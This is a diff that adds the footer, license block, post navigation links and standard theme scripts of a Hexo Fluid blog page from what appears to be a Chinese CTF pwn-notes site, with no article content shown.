+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/pwn-notes/2026/11/13/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/" title="hitcon2018childrentcache（off by null）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">hitcon2018childrentcache（off by null）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/pwn-notes/2026/11/13/sync-typora-pwn-v-n2020-easytheap-8e50cf/" title="[V&amp;N2020 公开赛]easyTHeap（差一步美满）">
+                        <span class="hidden-mobile">[V&amp;N2020 公开赛]easyTHeap（差一步美满）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/pwn-notes/js/events.js" ></script>
+<script  src="/pwn-notes/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/pwn-notes/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/pwn-notes/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/pwn-notes/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
